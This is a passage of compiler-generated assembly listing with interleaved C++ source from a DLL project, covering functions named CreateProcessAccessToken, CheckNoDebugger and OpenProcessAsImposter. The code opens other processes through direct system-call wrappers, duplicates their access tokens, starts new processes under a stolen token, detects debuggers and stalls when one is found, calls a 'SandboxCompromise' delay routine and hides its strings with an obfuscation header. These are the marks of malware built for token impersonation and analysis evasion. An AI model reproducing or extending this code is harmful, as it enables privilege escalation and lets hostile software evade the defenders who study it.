	mov	QWORD PTR ?_FreeLibrary@@3P6AHPEAX@ZEA, rax ; _FreeLibrary

; 110  : 
; 111  : 	return TRUE;

	mov	eax, 1

; 112  : }

	mov	rbx, QWORD PTR [rsp+120]
	add	rsp, 96					; 00000060H
	pop	rdi
	ret	0
$LN3@Init:

; 107  : 		return FALSE;

	xor	eax, eax

; 112  : }

	mov	rbx, QWORD PTR [rsp+120]
	add	rsp, 96					; 00000060H
	pop	rdi
	ret	0
?Init@ProcessUtilities@@YAHXZ ENDP			; ProcessUtilities::Init
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 64
$T3 = 64
$T4 = 64
?dtor$4@?0??Init@ProcessUtilities@@YAHXZ@4HA PROC	; `ProcessUtilities::Init'::`1'::dtor$4
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$4@?0??Init@ProcessUtilities@@YAHXZ@4HA ENDP	; `ProcessUtilities::Init'::`1'::dtor$4
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?CreateProcessAccessToken@ProcessUtilities@@YAPEAXK@Z
_TEXT	SEGMENT
process$ = 48
processToken$ = 56
duplicatedToken$ = 64
objectAttributes$ = 72
pInfo$ = 120
__$ArrayPad$ = 136
processID$ = 160
?CreateProcessAccessToken@ProcessUtilities@@YAPEAXK@Z PROC ; ProcessUtilities::CreateProcessAccessToken, COMDAT

; 163  : HANDLE ProcessUtilities::CreateProcessAccessToken(DWORD processID) {

$LN12:
	mov	QWORD PTR [rsp+16], rbx
	push	rbp
	lea	rbp, QWORD PTR [rsp-87]
	sub	rsp, 144				; 00000090H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rbp-57], rax

; 164  : 	OBJECT_ATTRIBUTES objectAttributes{};

	xor	ebx, ebx

; 165  : 	HANDLE            process = NULL;
; 166  : 	CLIENT_ID         pInfo{};
; 167  : 	pInfo.UniqueProcess = ( HANDLE ) processID;

	mov	eax, ecx
	xorps	xmm0, xmm0

; 168  : 	pInfo.UniqueThread = ( HANDLE ) 0;
; 169  : 
; 170  : 	InitializeObjectAttributes(&objectAttributes, 0, 0, 0, 0);

	mov	QWORD PTR objectAttributes$[rbp-33], rbx

; 171  : 
; 172  : 	NTSTATUS openStatus = SysNtOpenProcess(

	lea	rcx, QWORD PTR process$[rbp-57]
	mov	QWORD PTR process$[rbp-57], rbx
	lea	r9, QWORD PTR pInfo$[rbp-57]
	mov	QWORD PTR pInfo$[rbp-57], rax
	lea	r8, QWORD PTR objectAttributes$[rbp-57]
	mov	QWORD PTR pInfo$[rbp-49], rbx
	mov	edx, 33554432				; 02000000H
	mov	QWORD PTR objectAttributes$[rbp-49], rbx
	mov	QWORD PTR objectAttributes$[rbp-41], rbx
	movdqu	XMMWORD PTR objectAttributes$[rbp-25], xmm0
	mov	QWORD PTR objectAttributes$[rbp-57], 48	; 00000030H
	call	SysNtOpenProcess

; 173  : 		&process,
; 174  : 		MAXIMUM_ALLOWED,
; 175  : 		&objectAttributes,
; 176  : 		&pInfo
; 177  : 	);
; 178  : 
; 179  : 	if ( openStatus != STATUS_SUCCESS ) {

	test	eax, eax
	jne	SHORT $LN9@CreateProc

; 180  : 		return NULL;
; 181  : 	}
; 182  : 
; 183  : 	HANDLE   processToken = NULL;
; 184  : 	NTSTATUS openProcTokenStatus = SysNtOpenProcessTokenEx(process, TOKEN_DUPLICATE, 0, &processToken);

	mov	rcx, QWORD PTR process$[rbp-57]
	lea	r9, QWORD PTR processToken$[rbp-57]
	xor	r8d, r8d
	mov	QWORD PTR processToken$[rbp-57], rbx
	mov	edx, 2
	call	SysNtOpenProcessTokenEx

; 185  : 
; 186  : 	if ( openProcTokenStatus != STATUS_SUCCESS ) {

	test	eax, eax
	jne	SHORT $LN10@CreateProc

; 187  : 		SysNtClose(process);
; 188  : 		return NULL;
; 189  : 	}
; 190  : 
; 191  : 	InitializeObjectAttributes(&objectAttributes, 0, 0, 0, 0);
; 192  : 	HANDLE   duplicatedToken = NULL;
; 193  : 	NTSTATUS tokenDuplicated = SysNtDuplicateToken(

	mov	rcx, QWORD PTR processToken$[rbp-57]
	lea	rax, QWORD PTR duplicatedToken$[rbp-57]
	xorps	xmm0, xmm0
	mov	QWORD PTR [rsp+40], rax
	xor	r9d, r9d
	mov	DWORD PTR [rsp+32], 1
	lea	r8, QWORD PTR objectAttributes$[rbp-57]
	mov	DWORD PTR objectAttributes$[rbp-57], 48	; 00000030H
	mov	edx, 33554432				; 02000000H
	mov	QWORD PTR objectAttributes$[rbp-49], rbx
	mov	DWORD PTR objectAttributes$[rbp-33], ebx
	mov	QWORD PTR objectAttributes$[rbp-41], rbx
	movdqu	XMMWORD PTR objectAttributes$[rbp-25], xmm0
	mov	QWORD PTR duplicatedToken$[rbp-57], rbx
	call	SysNtDuplicateToken

; 194  : 		processToken,
; 195  : 		MAXIMUM_ALLOWED,
; 196  : 		&objectAttributes,
; 197  : 		FALSE,
; 198  : 		TokenPrimary,
; 199  : 		&duplicatedToken
; 200  : 	);
; 201  : 
; 202  : 	if ( tokenDuplicated != STATUS_SUCCESS ) {

	test	eax, eax
	je	SHORT $LN4@CreateProc

; 203  : 		SysNtClose(processToken);

	mov	rcx, QWORD PTR processToken$[rbp-57]
	call	SysNtClose
$LN10@CreateProc:

; 213  : }

	mov	rcx, QWORD PTR process$[rbp-57]
	call	SysNtClose
$LN9@CreateProc:
	xor	eax, eax
	jmp	SHORT $LN1@CreateProc
$LN4@CreateProc:

; 204  : 		SysNtClose(process);
; 205  : 		return NULL;
; 206  : 	}
; 207  : 	SandboxCompromise::DelayOperation();
; 208  : 
; 209  : 	SysNtClose(process);

	mov	rcx, QWORD PTR process$[rbp-57]
	call	SysNtClose

; 210  : 	SysNtClose(processToken);

	mov	rcx, QWORD PTR processToken$[rbp-57]
	call	SysNtClose

; 211  : 
; 212  : 	return duplicatedToken;

	mov	rax, QWORD PTR duplicatedToken$[rbp-57]
$LN1@CreateProc:

; 213  : }

	mov	rcx, QWORD PTR __$ArrayPad$[rbp-57]
	xor	rcx, rsp
	call	__security_check_cookie
	mov	rbx, QWORD PTR [rsp+168]
	add	rsp, 144				; 00000090H
	pop	rbp
	ret	0
?CreateProcessAccessToken@ProcessUtilities@@YAPEAXK@Z ENDP ; ProcessUtilities::CreateProcessAccessToken
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?CheckNoDebugger@ProcessUtilities@@YAHXZ
_TEXT	SEGMENT
obfuscator$1 = 32
?CheckNoDebugger@ProcessUtilities@@YAHXZ PROC		; ProcessUtilities::CheckNoDebugger, COMDAT

; 334  : BOOL ProcessUtilities::CheckNoDebugger() {

$LN31:
	push	rbx
	sub	rsp, 64					; 00000040H

; 335  : 	PPEB filePEB = ( PPEB ) GetPebAddress();

	call	GetPebAddress

; 336  : 	BYTE beingDebugged = filePEB->BeingDebugged;
; 337  : 
; 338  : 	if ( beingDebugged ) {

	cmp	BYTE PTR [rax+2], 0
	je	$LN2@CheckNoDeb

; 216  : 	system(HIDE("ping 127.0.0.1 -n 5693 > null "));

	movdqa	xmm0, XMMWORD PTR __xmm@b4e9824d098f09bfaefb82435ecf50e1
	mov	DWORD PTR obfuscator$1[rsp+16], 261364223 ; 0f9419ffH
	mov	DWORD PTR obfuscator$1[rsp+20], -1477869478 ; a7e9805aH
	mov	DWORD PTR obfuscator$1[rsp+24], 1439979441 ; 55d457b1H
	mov	WORD PTR obfuscator$1[rsp+28], 37647	; 0000930fH
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@4V45@A
	test	al, 1
	jne	SHORT $LN24@CheckNoDeb
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [r8+rdx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rbx+31], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 216  : 	system(HIDE("ping 127.0.0.1 -n 5693 > null "));

	lea	rax, QWORD PTR [rbx+30]
	lea	rcx, QWORD PTR obfuscator$1[rsp+30]
	cmp	rbx, rcx
	ja	SHORT $LN21@CheckNoDeb
	lea	rcx, QWORD PTR obfuscator$1[rsp]
	cmp	rax, rcx
	jb	SHORT $LN21@CheckNoDeb
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$1[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	mov	eax, DWORD PTR obfuscator$1[rsp+24]
	mov	DWORD PTR [rbx+24], eax
	movzx	eax, WORD PTR obfuscator$1[rsp+28]
	mov	WORD PTR [rbx+28], ax
	mov	BYTE PTR [rbx+30], 201			; 000000c9H
	jmp	SHORT $LN27@CheckNoDeb
$LN21@CheckNoDeb:
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$1[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	mov	eax, DWORD PTR obfuscator$1[rsp+24]
	mov	DWORD PTR [rbx+24], eax
	movzx	eax, WORD PTR obfuscator$1[rsp+28]
	mov	WORD PTR [rbx+28], ax
	mov	BYTE PTR [rbx+30], 201			; 000000c9H
$LN27@CheckNoDeb:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::HaltProcessExecution'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	jmp	SHORT $LN7@CheckNoDeb
$LN24@CheckNoDeb:
	lea	rbx, QWORD PTR [rdx+r8]
$LN7@CheckNoDeb:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 140  : 			decrypt();

	mov	rcx, rbx
	call	?decrypt@?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAXXZ ; ay::obfuscated_data<31,-7365158476837733999,char>::decrypt
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 216  : 	system(HIDE("ping 127.0.0.1 -n 5693 > null "));

	mov	rcx, rbx
	call	system

; 339  : 		HaltProcessExecution();
; 340  : 		return TRUE;

	mov	eax, 1

; 344  : }

	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
$LN2@CheckNoDeb:

; 341  : 	}
; 342  : 
; 343  : 	return FALSE;

	xor	eax, eax

; 344  : }

	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
?CheckNoDebugger@ProcessUtilities@@YAHXZ ENDP		; ProcessUtilities::CheckNoDebugger
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$1 = 32
?dtor$0@?0??CheckNoDebugger@ProcessUtilities@@YAHXZ@4HA PROC ; `ProcessUtilities::CheckNoDebugger'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0??CheckNoDebugger@ProcessUtilities@@YAHXZ@4HA ENDP ; `ProcessUtilities::CheckNoDebugger'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z
_TEXT	SEGMENT
obfuscator$1 = 80
$T2 = 112
$T3 = 120
$T4 = 128
$T5 = 160
$T6 = 192
token$ = 272
dwLogonFlags$dead$ = 280
lpApplicationName$dead$ = 288
lpCommandLine$ = 296
dwCreationFlags$dead$ = 304
lpEnvironment$dead$ = 312
lpCurrentDirectory$dead$ = 320
lpStartupInfo$ = 328
lpProcessInformation$ = 336
?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z PROC ; ProcessUtilities::OpenProcessAsImposter, COMDAT

; 228  : 	LPPROCESS_INFORMATION lpProcessInformation

$LN74:
	mov	QWORD PTR [rsp+16], rbx
	push	rbp
	push	rsi
	push	rdi
	push	r14
	push	r15
	sub	rsp, 224				; 000000e0H
	mov	rbp, r9
	mov	rsi, rcx
	mov	r14, QWORD PTR lpStartupInfo$[rsp]
	mov	r15, QWORD PTR lpProcessInformation$[rsp]

; 230  : 	PPROCFN::_CreateProcessWithTokenW pCreateProcessWithTokenW = GetFunctionAddress<PPROCFN::_CreateProcessWithTokenW>(GetLoadedLib(freqDLLS::advapi32), std::string(HIDE("CreateProcessWithTokenW")));

	lea	rax, QWORD PTR $T4[rsp]
	mov	QWORD PTR $T2[rsp], rax
	movdqa	xmm0, XMMWORD PTR __xmm@8548e83236e44a0c8371da3524e45b20
	mov	DWORD PTR obfuscator$1[rsp+16], 787381515 ; 2eee7d0bH
	mov	DWORD PTR obfuscator$1[rsp+20], -243871452 ; f176d124H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@4V67@A
	test	al, 1
	jne	SHORT $LN66@OpenProces
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [r8+rdx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rbx+24], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 230  : 	PPROCFN::_CreateProcessWithTokenW pCreateProcessWithTokenW = GetFunctionAddress<PPROCFN::_CreateProcessWithTokenW>(GetLoadedLib(freqDLLS::advapi32), std::string(HIDE("CreateProcessWithTokenW")));

	lea	rax, QWORD PTR [rbx+23]
	lea	rcx, QWORD PTR obfuscator$1[rsp+23]
	cmp	rbx, rcx
	ja	SHORT $LN63@OpenProces
	lea	rcx, QWORD PTR obfuscator$1[rsp]
	cmp	rax, rcx
	jb	SHORT $LN63@OpenProces
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$1[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
	jmp	SHORT $LN69@OpenProces
$LN63@OpenProces:
	movups	XMMWORD PTR [rbx], xmm0
	movsd	xmm0, QWORD PTR obfuscator$1[rsp+16]
	movsd	QWORD PTR [rbx+16], xmm0
$LN69@OpenProces:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::OpenProcessAsImposter'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	jmp	SHORT $LN6@OpenProces
$LN66@OpenProces:
	lea	rbx, QWORD PTR [rdx+r8]
$LN6@OpenProces:
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 140  : 			decrypt();

	mov	rcx, rbx
	call	?decrypt@?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAAXXZ ; ay::obfuscated_data<24,-1071364949277595293,char>::decrypt
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 230  : 	PPROCFN::_CreateProcessWithTokenW pCreateProcessWithTokenW = GetFunctionAddress<PPROCFN::_CreateProcessWithTokenW>(GetLoadedLib(freqDLLS::advapi32), std::string(HIDE("CreateProcessWithTokenW")));

	mov	rdx, rbx
	lea	rcx, QWORD PTR $T4[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdi, rax
	mov	QWORD PTR $T3[rsp], rax
	lea	rdx, OFFSET FLAT:?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B
	lea	rcx, QWORD PTR $T5[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rcx, rax
	call	?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetLoadedLib
	mov	rbx, rax
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\procutils.h

; 69   : 		return reinterpret_cast< fpType >( _GetFuncAddress(lib, proc) );

	mov	rdx, rdi
	lea	rcx, QWORD PTR $T6[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rdx, rax
	mov	rcx, rbx
	call	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
	mov	rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdi+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN37@OpenProces

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rdi]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN51@OpenProces

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN48@OpenProces

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN51@OpenProces:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN37@OpenProces:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	xor	eax, eax
	mov	QWORD PTR [rdi+16], rax

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rdi+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rdi], al
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 231  : 	return pCreateProcessWithTokenW(

	mov	QWORD PTR [rsp+64], r15
	mov	QWORD PTR [rsp+56], r14
	mov	QWORD PTR [rsp+48], rax
	mov	QWORD PTR [rsp+40], rax
	mov	DWORD PTR [rsp+32], 16
	mov	r9, rbp
	xor	r8d, r8d
	mov	edx, 1
	mov	rcx, rsi
	call	rbx

; 242  : }

	mov	rbx, QWORD PTR [rsp+280]
	add	rsp, 224				; 000000e0H
	pop	r15
	pop	r14
	pop	rdi
	pop	rsi
	pop	rbp
	ret	0
$LN48@OpenProces:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN71@OpenProces:
?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z ENDP ; ProcessUtilities::OpenProcessAsImposter
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$1 = 80
$T2 = 112
$T3 = 120
$T4 = 128
$T5 = 160
$T6 = 192
token$ = 272
dwLogonFlags$dead$ = 280
lpApplicationName$dead$ = 288
lpCommandLine$ = 296
dwCreationFlags$dead$ = 304
lpEnvironment$dead$ = 312
lpCurrentDirectory$dead$ = 320
lpStartupInfo$ = 328
lpProcessInformation$ = 336
?dtor$2@?0??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@4HA PROC ; `ProcessUtilities::OpenProcessAsImposter'::`1'::dtor$2
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$2@?0??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@4HA ENDP ; `ProcessUtilities::OpenProcessAsImposter'::`1'::dtor$2
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$1 = 80
$T2 = 112
$T3 = 120
$T4 = 128
$T5 = 160
$T6 = 192
token$ = 272
dwLogonFlags$dead$ = 280
lpApplicationName$dead$ = 288
lpCommandLine$ = 296
dwCreationFlags$dead$ = 304
lpEnvironment$dead$ = 312
lpCurrentDirectory$dead$ = 320
lpStartupInfo$ = 328
lpProcessInformation$ = 336
?dtor$0@?0??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@4HA PROC ; `ProcessUtilities::OpenProcessAsImposter'::`1'::dtor$0
	mov	rcx, QWORD PTR $T2[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
